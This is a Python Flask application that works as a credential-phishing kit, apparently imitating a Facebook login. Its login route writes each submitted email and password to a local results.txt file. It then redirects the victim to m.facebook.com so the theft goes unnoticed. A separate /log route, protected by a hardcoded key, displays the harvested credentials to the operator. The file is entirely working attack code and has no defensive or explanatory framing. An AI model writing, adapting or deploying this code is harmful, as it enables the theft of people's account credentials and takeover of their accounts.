from flask import Flask, request, render_template, redirect

app = Flask("Event")
app_key = "jihan2001@@##"

@app.route("/log", methods=["GET","POST"])
def logs():
	if request.method == "POST":
		key = request.form["key"]
		if key == app_key:
			try:
				data = open("results.txt","r").readlines()
			except:
				data = []
			return render_template("log.html", a=data)
		else:
			return render_template("key.html", a=True)
	else:
		return render_template("key.html")

@app.route("/", methods=["GET","POST"])
def login():
	if request.method == "POST":
		email = request.form["email"]
		password = request.form["pass"]
		if email.replace(" ","") == "" and password.replace(" ","") == "":
			return render_template("template_sec_all.html")
		else:
			if email.replace(" ","") == "":
				return render_template("template_sec_email.html")
			else:
				if password.replace(" ","") == "":
					return render_template("template_sec_pass.html")
				else:
					open("results.txt","a").write(f"{email}|{password}\n")
					return redirect("https://m.facebook.com", code=302)
	return render_template("template.html")
